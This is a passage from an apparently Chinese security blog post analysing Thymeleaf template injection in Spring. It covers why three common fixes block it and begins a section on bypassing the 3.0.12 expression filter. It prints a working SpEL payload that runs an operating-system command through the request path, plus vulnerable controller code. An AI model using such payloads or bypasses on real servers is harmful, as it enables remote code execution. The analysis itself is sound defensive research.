+	srcset="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306210917535_hubddb4a0dd662908ce86736481cba2427_102000_480x0_resize_box_3.png 480w, /p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306210917535_hubddb4a0dd662908ce86736481cba2427_102000_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240306210917535"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="148"
+		data-flex-basis="355px"
+	
+></p>
+<h3 id="0x03-thymeleaf-ssti-修复方案分析">0x03 Thymeleaf SSTI 修复方案分析</h3>
+<p><code>spring-view-manipulation</code> 给出了三种修复方案，下面逐一分析无法触发的原因</p>
+<h5 id="方案一添加-responsebody-注解">方案一：添加 @ResponseBody 注解</h5>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#61afef">@GetMapping</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;/safe/fragment&#34;</span><span style="color:#56b6c2">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#61afef">@ResponseBody</span>
+</span></span><span style="display:flex;"><span><span style="color:#c678dd">public</span> <span style="color:#e06c75">String</span> <span style="color:#61afef;font-weight:bold">safeFragment</span><span style="color:#56b6c2">(</span><span style="color:#61afef">@RequestParam</span> <span style="color:#e06c75">String</span> <span style="color:#e06c75">section</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">{</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">return</span> <span style="color:#98c379">&#34;welcome :: &#34;</span> <span style="color:#56b6c2">+</span> <span style="color:#e06c75">section</span><span style="color:#56b6c2">;</span> 
+</span></span><span style="display:flex;"><span><span style="color:#56b6c2">}</span>
+</span></span></code></pre></div><p><strong>HandlerMethodReturnValueHandlerComposite#handleReturnValue</strong></p>
+<p><img src="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306215459786.png"
+	width="1318"
+	height="362"
+	srcset="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306215459786_hu84d52d1e27b2de899f4da5cd38d608bc_70928_480x0_resize_box_3.png 480w, /p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306215459786_hu84d52d1e27b2de899f4da5cd38d608bc_70928_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240306215459786"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="364"
+		data-flex-basis="873px"
+	
+></p>
+<p><strong>HandlerMethodReturnValueHandlerComposite#selectHandler</strong></p>
+<p><img src="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306215638695.png"
+	width="1347"
+	height="377"
+	srcset="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306215638695_hua9ac8571ab441b0d787128e358ff5ee5_74429_480x0_resize_box_3.png 480w, /p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306215638695_hua9ac8571ab441b0d787128e358ff5ee5_74429_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240306215638695"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="357"
+		data-flex-basis="857px"
+	
+></p>
+<p><code>selectHandler</code> 方法会根据 <code>returnType</code> 选择合适的 <code>handler</code>，由于设置了 <code>@ResponseBody</code> 注解，因此交给<code>RequestResponseBodyMethodProcessor</code> 处理 <code>returnType</code></p>
+<p><strong>RequestResponseBodyMethodProcessor#handleReturnValue</strong></p>
+<p><img src="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306215848760.png"
+	width="1325"
+	height="360"
+	srcset="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306215848760_hue1cebe05434c0cc8abfd56b74867b50c_84442_480x0_resize_box_3.png 480w, /p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306215848760_hue1cebe05434c0cc8abfd56b74867b50c_84442_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240306215848760"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="368"
+		data-flex-basis="883px"
+	
+></p>
+<p>该方法并不会为 <code>ModelAndViewContainer</code> 设置 <code>viewName</code>，且把 <code>requestHandled</code> 属性置为 <code>true</code>，所以不会创建<code>ModelAndView</code> 对象</p>
+<h5 id="方案二设置-redirect-重定向"><strong>方案二：设置 redirect 重定向</strong></h5>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#61afef">@GetMapping</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;/safe/redirect&#34;</span><span style="color:#56b6c2">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#c678dd">public</span> <span style="color:#e06c75">String</span> <span style="color:#61afef;font-weight:bold">redirect</span><span style="color:#56b6c2">(</span><span style="color:#61afef">@RequestParam</span> <span style="color:#e06c75">String</span> <span style="color:#e06c75">url</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">{</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">return</span> <span style="color:#98c379">&#34;redirect:&#34;</span> <span style="color:#56b6c2">+</span> <span style="color:#e06c75">url</span><span style="color:#56b6c2">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#56b6c2">}</span>
+</span></span></code></pre></div><p><strong>DispatcherServlet#resolveViewName</strong></p>
+<p><img src="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306220531839.png"
+	width="1316"
+	height="399"
+	srcset="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306220531839_huc983d0443f6d7cc9cce81b270a00eaa0_67105_480x0_resize_box_3.png 480w, /p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306220531839_huc983d0443f6d7cc9cce81b270a00eaa0_67105_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240306220531839"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="329"
+		data-flex-basis="791px"
+	
+></p>
+<p>这里返回的是 <code>RedirectView</code> 对象，后续调用 <code>RedirectView#render</code> 方法，而不是 <code>ThymeleafView#render</code>，无法对其<code>SpEL</code> 解析</p>
+<p><img src="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306220702088.png"
+	width="1190"
+	height="296"
+	srcset="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306220702088_hu74c39c5e87cb1527905e93a80408ee78_38297_480x0_resize_box_3.png 480w, /p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306220702088_hu74c39c5e87cb1527905e93a80408ee78_38297_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240306220702088"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="402"
+		data-flex-basis="964px"
+	
+></p>
+<h5 id="方案三请求参数添加-httpservlerresponse"><strong>方案三</strong>：请求参数添加 HttpServlerResponse</h5>
+<p>首先分析没有返回值也能触发 <code>Thymeleaf SSTI</code> 的原因</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#61afef">@GetMapping</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;/doc/{document}&#34;</span><span style="color:#56b6c2">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#c678dd">public</span> <span style="color:#e5c07b">void</span> <span style="color:#61afef;font-weight:bold">getDocument</span><span style="color:#56b6c2">(</span><span style="color:#61afef">@PathVariable</span> <span style="color:#e06c75">String</span> <span style="color:#e06c75">document</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">{</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">log</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">info</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;Retrieving &#34;</span> <span style="color:#56b6c2">+</span> <span style="color:#e06c75">document</span><span style="color:#56b6c2">);</span>
+</span></span><span style="display:flex;"><span><span style="color:#56b6c2">}</span>
+</span></span></code></pre></div><p><strong>DispatcherServlet#doDispatch</strong></p>
+<p><img src="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306224827571.png"
+	width="1314"
+	height="379"
+	srcset="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306224827571_hud8d9744e589e5e996266c846dda61bb0_55553_480x0_resize_box_3.png 480w, /p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306224827571_hud8d9744e589e5e996266c846dda61bb0_55553_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240306224827571"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="346"
+		data-flex-basis="832px"
+	
+></p>
+<p>进入 <code>addlyDefaultViewName</code> 方法</p>
+<p><strong>DispatcherServlet#applyDefaultViewName</strong></p>
+<p><img src="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306224921569.png"
+	width="1321"
+	height="666"
+	srcset="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306224921569_hu360c869403d22e978552910b6a036149_119411_480x0_resize_box_3.png 480w, /p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306224921569_hu360c869403d22e978552910b6a036149_119411_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240306224921569"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="198"
+		data-flex-basis="476px"
+	
+></p>
+<p><code>getDocument</code> 方法返回为空，<code>DispatcherServlet</code> 便调用 <code>addlyDefaultViewName</code> 方法为 <code>ModelAndView</code> 设置一个 <code>defaultViewName</code></p>
+<p><code>defaultViewName</code> 是根据请求路径生成的，而当前路径为：</p>
+<p><code>doc/__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(&quot;calc&quot;).getInputStream()).next()}__::</code></p>
+<p>故而能够 <code>SSTI</code></p>
+<hr>
+<p>对于请求参数设置了 <code>HttpServletResponse</code> 的情况</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#61afef">@GetMapping</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;/safe/doc/{document}&#34;</span><span style="color:#56b6c2">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#c678dd">public</span> <span style="color:#e5c07b">void</span> <span style="color:#61afef;font-weight:bold">getDocument</span><span style="color:#56b6c2">(</span><span style="color:#61afef">@PathVariable</span> <span style="color:#e06c75">String</span> <span style="color:#e06c75">document</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">HttpServletResponse</span> <span style="color:#e06c75">response</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">{</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">log</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">info</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;Retrieving &#34;</span> <span style="color:#56b6c2">+</span> <span style="color:#e06c75">document</span><span style="color:#56b6c2">);</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#7f848e">// return &#34;Retrieving &#34; + document 在有返回值的情况下, 即使设置了 response 也能触发 Thymeleaf SSTI
+</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span><span style="color:#56b6c2">}</span>
+</span></span></code></pre></div><p><strong>ServletInvocableHandlerMethod#invokeAndHandle</strong></p>
+<p><img src="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306231306355.png"
+	width="1310"
+	height="470"
+	srcset="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306231306355_hu473723f30bde6f130bb47f710e5ee1ba_84583_480x0_resize_box_3.png 480w, /p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306231306355_hu473723f30bde6f130bb47f710e5ee1ba_84583_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240306231306355"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="278"
+		data-flex-basis="668px"
+	
+></p>
+<p><strong>InvocableHandlerMethod#invokeForRequest</strong></p>
+<p><img src="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306231347986.png"
+	width="1325"
+	height="287"
+	srcset="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306231347986_hu197bb76a2a6c6b4292d253b48da71d0b_61775_480x0_resize_box_3.png 480w, /p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306231347986_hu197bb76a2a6c6b4292d253b48da71d0b_61775_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240306231347986"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="461"
+		data-flex-basis="1108px"
+	
+></p>
+<p>在调用 <code>HelloController#getDocument</code> 前，<code>invokeForRequest</code> 会先调用 <code>getMethodArgumentValues</code> 获取请求参数 <code>args</code></p>
+<p><strong>InvocableHandlerMethod#getMethodArgumentValues</strong></p>
+<p><img src="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306231904976.png"
+	width="1294"
+	height="758"
+	srcset="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306231904976_hua7a449f815a6882fae3f41d8ab10b314_243900_480x0_resize_box_3.png 480w, /p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306231904976_hua7a449f815a6882fae3f41d8ab10b314_243900_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240306231904976"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="170"
+		data-flex-basis="409px"
+	
+></p>
+<p>分别获取请求参数 <code>String document</code> 和 <code>HttpServletResponse response</code></p>
+<p><img src="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306232022900.png"
+	width="1311"
+	height="398"
+	srcset="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306232022900_huf49f4c109089bde003f87e01a885d04f_90091_480x0_resize_box_3.png 480w, /p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306232022900_huf49f4c109089bde003f87e01a885d04f_90091_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240306232022900"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="329"
+		data-flex-basis="790px"
+	
+></p>
+<p>随后调用 <code>resolvers.resolveArgument</code> 方法，解析 <code>parameter</code></p>
+<p><strong>HandlerMethodArgumentResolverComposite#resolveArgument</strong></p>
+<p><img src="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306232347962.png"
+	width="1338"
+	height="366"
+	srcset="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306232347962_hu87c725642c76c6d167762608a969cd90_72052_480x0_resize_box_3.png 480w, /p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306232347962_hu87c725642c76c6d167762608a969cd90_72052_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240306232347962"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="365"
+		data-flex-basis="877px"
+	
+></p>
+<p><code>HttpServletResponse</code> 类型对应的 <code>resolver</code> 是 <code>ServletResponseMethodArgumentResolver</code></p>
+<p><strong>ServletResponseMethodArgumentResolver#resolveArgument</strong></p>
+<p><img src="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306232455771.png"
+	width="1324"
+	height="415"
+	srcset="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306232455771_hu5d1f6d2e29829f2ff4a398b967112a7f_64209_480x0_resize_box_3.png 480w, /p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306232455771_hu5d1f6d2e29829f2ff4a398b967112a7f_64209_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240306232455771"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="319"
+		data-flex-basis="765px"
+	
+></p>
+<p>这里会将 <code>ModelAndViewContainer</code> 的 <code>requestHandled</code> 属性设置为 <code>true</code>，所以无法创建 <code>ModelAndView</code> 对象</p>
+<hr>
+<p>笔者挖掘的 <code>SSTI</code> 漏洞大致如下</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#61afef">@GetMapping</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;/path2&#34;</span><span style="color:#56b6c2">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#7f848e">// 这种情况即使添加了@ResponseBody 注解和 HttpServletResponse 也能触发 SSTI
+</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span><span style="color:#c678dd">public</span> <span style="color:#e06c75">ModelAndView</span> <span style="color:#61afef;font-weight:bold">path2</span><span style="color:#56b6c2">(</span><span style="color:#61afef">@RequestParam</span> <span style="color:#e06c75">String</span> <span style="color:#e06c75">p</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">HttpServletResponse</span> <span style="color:#e06c75">response</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">{</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">return</span> <span style="color:#c678dd">new</span> <span style="color:#e06c75">ModelAndView</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">p</span><span style="color:#56b6c2">);</span>
+</span></span><span style="display:flex;"><span><span style="color:#56b6c2">}</span>
+</span></span></code></pre></div><p><strong>HandlerMethodReturnValueHandlerComposite#handleReturnValue</strong></p>
+<p><img src="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306215459786.png"
+	width="1318"
+	height="362"
+	srcset="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306215459786_hu84d52d1e27b2de899f4da5cd38d608bc_70928_480x0_resize_box_3.png 480w, /p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306215459786_hu84d52d1e27b2de899f4da5cd38d608bc_70928_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240306215459786"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="364"
+		data-flex-basis="873px"
+	
+></p>
+<p><code>handleReturnValue</code> 方法对于类型为 <code>ModelAndView</code> 的 <code>returnType</code>，将调用 <code>ModelAndViewMethodReturnValueHandler</code>处理结果</p>
+<p><strong>ModelAndViewMethodReturnValueHandler#handleReturnValue</strong></p>
+<p><img src="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306235122895.png"
+	width="1339"
+	height="473"
+	srcset="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306235122895_hu4df097b558c32e8d28731efccaf437f8_89922_480x0_resize_box_3.png 480w, /p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306235122895_hu4df097b558c32e8d28731efccaf437f8_89922_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240306235122895"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="283"
+		data-flex-basis="679px"
+	
+></p>
+<p><code>ModelAndViewMethodReturnValueHandler</code> 的 <code>handleReturnValue</code> 方法同样能给 <code>ModelAndViewContainer</code> 设置 <code>viewName</code> 属性，因此能触发 <code>SSTI</code></p>
+<h3 id="0x04-高版本-bypass">0x04 高版本 Bypass</h3>
+<h4 id="thymeleaf-30x">Thymeleaf 3.0.x</h4>
+<h5 id="-thymeleaf-3012">&lt;= Thymeleaf 3.0.12</h5>
+<p><strong>SPELVariableExpressionEvaluator#evaluate</strong></p>
+<p><code>Thymeleaf 3.0.12</code>  版本在 <code>SPELVariableExpressionEvaluator#getExpression</code> 方法做了如下修改</p>
+<p><img src="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240308083649270.png"
+	width="1441"
+	height="468"
+	srcset="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240308083649270_hubca27d0cf0de7b08f3b1cb469ccf24ea_76692_480x0_resize_box_3.png 480w, /p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240308083649270_hubca27d0cf0de7b08f3b1cb469ccf24ea_76692_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240308083649270"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="307"
+		data-flex-basis="738px"
+	
+></p>
+<p>新增了 <code>SpringStandardExpressionUtils.containsSpELInstantiationOrStatic</code>  方法校验 <code>expression</code></p>
+<p><img src="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240308084052860.png"
+	width="1313"
+	height="898"
+	srcset="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240308084052860_huf046d4cec9ff3f3737b75474dcf9178d_74359_480x0_resize_box_3.png 480w, /p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240308084052860_huf046d4cec9ff3f3737b75474dcf9178d_74359_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240308084052860"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="146"
+		data-flex-basis="350px"
+	
+></p>
+<p><img src="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240308084111448.png"
+	width="1310"
+	height="450"
+	srcset="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240308084111448_hu5c33fc82b0e7775d13eb4af694dd346d_24578_480x0_resize_box_3.png 480w, /p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240308084111448_hu5c33fc82b0e7775d13eb4af694dd346d_24578_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240308084111448"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="291"
+		data-flex-basis="698px"
+	
+></p>
+<p>倒序扫描 <code>exression</code> ，如果检测到 <code>new(空格)</code> 或者 <code>T(</code> 就返回 <code>true</code>，表示该 <code>expression</code> 非法</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#c678dd">if</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">c</span> <span style="color:#56b6c2">==</span> <span style="color:#98c379">&#39;)&#39;</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">{</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">si</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">n</span><span style="color:#56b6c2">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#56b6c2">}</span> <span style="color:#c678dd">else</span> <span style="color:#c678dd">if</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">si</span> <span style="color:#56b6c2">&gt;</span> <span style="color:#e06c75">n</span> <span style="color:#56b6c2">&amp;&amp;</span> <span style="color:#e06c75">c</span> <span style="color:#56b6c2">==</span> <span style="color:#98c379">&#39;(&#39;</span>
+</span></span><span style="display:flex;"><span>           <span style="color:#56b6c2">&amp;&amp;</span> <span style="color:#56b6c2">((</span><span style="color:#e06c75">n</span> <span style="color:#56b6c2">-</span> <span style="color:#d19a66">1</span> <span style="color:#56b6c2">&gt;=</span> <span style="color:#d19a66">0</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">&amp;&amp;</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">expression</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">charAt</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">n</span> <span style="color:#56b6c2">-</span> <span style="color:#d19a66">1</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">==</span> <span style="color:#98c379">&#39;T&#39;</span><span style="color:#56b6c2">))</span>
